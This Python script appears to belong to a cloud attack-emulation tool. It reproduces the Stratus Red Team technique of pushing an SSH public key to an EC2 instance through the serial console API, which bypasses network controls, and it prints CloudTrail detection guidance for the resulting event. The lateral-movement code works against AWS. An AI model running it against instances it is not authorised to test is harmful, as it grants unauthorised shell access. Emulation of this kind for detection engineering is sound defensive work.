"""
Technique : aws.lateral-movement.ec2-serial-console-send-ssh-public-key
Tactic    : Lateral Movement (T1021.004)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.lateral-movement.ec2-serial-console-send-ssh-public-key/

Pre-requisites:
  - Run `pulumi up` in ../infra/ first to create the EC2 instance.
  - EC2 serial console access must be enabled at the AWS account level:
      aws ec2 enable-serial-console-access --region <region>

How the attack works:
  An attacker uses EC2 Instance Connect's serial console API to push their SSH
  public key directly to an instance's serial console, bypassing security groups
  and network ACLs. This technique works even when port 22 is firewalled — the
  only requirement is that serial console access is enabled at the account level.

Detection signal:
  - ec2-instance-connect:SendSerialConsoleSSHPublicKey — an extremely rare API
    call that is almost never used in legitimate operations.

Revert:
  - Nothing to revert (the key expires automatically after 60 seconds).
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import json
import os
import subprocess
from pathlib import Path

import boto3
from botocore.exceptions import ClientError


# ── Helpers ───────────────────────────────────────────────────────────────────

def get_pulumi_outputs(stack_dir: str) -> dict:
    result = subprocess.run(
        ["pulumi", "stack", "output", "--json", "--show-secrets"],
        cwd=stack_dir, capture_output=True, text=True,
        env={**os.environ, "PULUMI_CONFIG_PASSPHRASE": os.environ.get("PULUMI_CONFIG_PASSPHRASE", "")},
    )
    if result.returncode != 0:
        print(f"[!] pulumi stack output failed: {result.stderr.strip()}")
        return {}
    return json.loads(result.stdout)


def banner(msg: str) -> None:
    print(f"\n{'=' * 60}\n  {msg}\n{'=' * 60}")


_FALLBACK_PUBKEY = (
    "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFakeKeyForStratusRedTeamTesting"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    " stratus-red-team-test"
)


def generate_ssh_public_key() -> str:
    """Generate a temporary RSA-2048 SSH public key in OpenSSH format."""
    try:
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.asymmetric import rsa

        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        return key.public_key().public_bytes(
            serialization.Encoding.OpenSSH,
            serialization.PublicFormat.OpenSSH,
        ).decode("utf-8")
    except ImportError:
        print("  [~] cryptography library not installed — using fallback public key (non-functional)")
        return _FALLBACK_PUBKEY


# ── Main ──────────────────────────────────────────────────────────────────────

def main(session: "boto3.Session") -> None:
    stack_dir    = str(Path(__file__).parent.parent / "infra")
    infra        = get_pulumi_outputs(stack_dir)
    instance_id  = infra.get("instance_id", "")
    ec2_username = infra.get("ec2_username", "ec2-user")

    if not instance_id:
        print("[!] instance_id not found. Did you run `pulumi up`?")
        return

    ec2ic   = session.client("ec2-instance-connect")

    banner("Step 1 — Generate temporary RSA-2048 SSH public key")
    public_key = generate_ssh_public_key()
    print(f"  [+] Public key generated ({len(public_key)} bytes)")

    banner("Step 2 — Send SSH public key via EC2 Serial Console (SendSerialConsoleSSHPublicKey)")
    print("  [!] Note: Requires serial console access enabled at account level.")
    try:
        response   = ec2ic.send_serial_console_ssh_public_key(
            InstanceId=instance_id,
            SSHPublicKey=public_key,
        )
        success    = response.get("Success", False)
        request_id = response.get("RequestId", "")
        print(f"  [+] SendSerialConsoleSSHPublicKey: Success={success}")
        print(f"  [+] RequestId: {request_id}")
        print(f"  [!] CloudTrail event: ec2-instance-connect:SendSerialConsoleSSHPublicKey")
        print(f"  [!] 60-second serial console window open for {ec2_username}@{instance_id}")
    except ClientError as exc:
        err = exc.response["Error"]
        print(f"  [!] SendSerialConsoleSSHPublicKey: {err['Code']} — {err['Message']}")
        if err["Code"] == "SerialConsoleAccessDisabled":
            print("  [~] Enable serial console: aws ec2 enable-serial-console-access")
        elif err["Code"] == "EC2InstanceTypeInvalidForConnectService":
            print("  [~] Instance type does not support serial console.")
        print("  [~] Note: The CloudTrail attempt event is still generated on failure.")

    banner("Complete")
    print("CloudTrail event generated: ec2-instance-connect:SendSerialConsoleSSHPublicKey")
    print("\nDetection guidance:")
    print("  Alert on any SendSerialConsoleSSHPublicKey — this API is almost never")
    print("  used legitimately and bypasses all network-layer controls.")
    print("\nRun `pulumi destroy` in ../infra/ to remove the instance.")


if __name__ == "__main__":
    main(boto3.Session())


# ── MayaTrail Option-C entry point ─────────────────────────────────────────────

def _session_from_outputs(outputs: dict, region: str) -> boto3.Session:
    """Build a session from the worker-injected assumed-role creds (Option C);
    fall back to the ambient default session when run standalone."""
    creds = (outputs or {}).get("_aws_credentials")
    if creds:
        return boto3.Session(
            aws_access_key_id=creds.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=creds.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=creds.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def run(outputs: dict, region: str = "us-east-1") -> None:
    """Entry point called by the run_emulation_attack Celery task."""
    main(_session_from_outputs(outputs, region))
